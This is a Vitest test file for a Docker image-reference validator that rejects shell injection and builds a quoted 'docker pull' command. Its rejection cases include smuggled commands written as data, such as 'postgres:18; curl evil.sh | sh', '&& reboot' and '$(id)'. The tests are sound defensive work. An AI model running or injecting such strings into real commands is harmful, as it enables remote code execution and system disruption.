import {
	dockerPullCommand,
	isValidDockerImageReference,
} from "@nearzero/server/utils/docker/image-reference";
import { describe, expect, it } from "vitest";

describe("docker image references", () => {
	it("accepts registry, tag and digest forms", () => {
		for (const image of [
			"postgres:18",
			"ghcr.io/org/app:1.2.3",
			"registry.example.com:5000/team/db",
			"redis@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
		]) {
			expect(isValidDockerImageReference(image)).toBe(true);
		}
	});

	it("rejects shell fragments and CLI flags", () => {
		for (const image of [
			"postgres:18; curl evil.sh | sh",
			"postgres:18 && reboot",
			"$(id)",
			"`id`",
			"--help",
			"-q",
			"",
		]) {
			expect(isValidDockerImageReference(image)).toBe(false);
			expect(() => dockerPullCommand(image)).toThrow();
		}
	});

	it("builds a quoted pull command", () => {
		expect(dockerPullCommand("postgres:18")).toBe("docker pull 'postgres:18'");
		expect(dockerPullCommand(" ghcr.io/org/app:1 ")).toBe(
			"docker pull 'ghcr.io/org/app:1'",
		);
	});
});
